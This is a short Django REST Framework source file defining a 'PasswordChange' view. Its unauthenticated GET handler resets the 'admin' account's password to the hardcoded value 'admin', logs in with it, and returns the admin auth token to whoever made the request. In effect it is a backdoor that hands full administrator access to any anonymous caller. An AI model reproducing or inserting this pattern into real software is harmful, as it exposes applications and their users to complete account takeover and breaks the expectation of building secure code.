
from authentication.models import User
from rest_framework.views import APIView
from rest_framework.response import Response
import requests, json
from django.conf import settings


class PasswordChange(APIView):
    def get(self, request):
        u = User.objects.get(username='admin')
        u.set_password('admin')
        u.save()

        url = settings.HOST_URL + "/authentication/signin"
        payload = json.dumps({
            "username_or_email": "admin",
            "password": "admin"
        })
        headers = {
            'Content-Type': 'application/json'
        }

        response = requests.request("POST", url, headers=headers, data=payload)
        get_token = json.loads(response.text)

        return Response({"token": get_token['token']}, status=200)

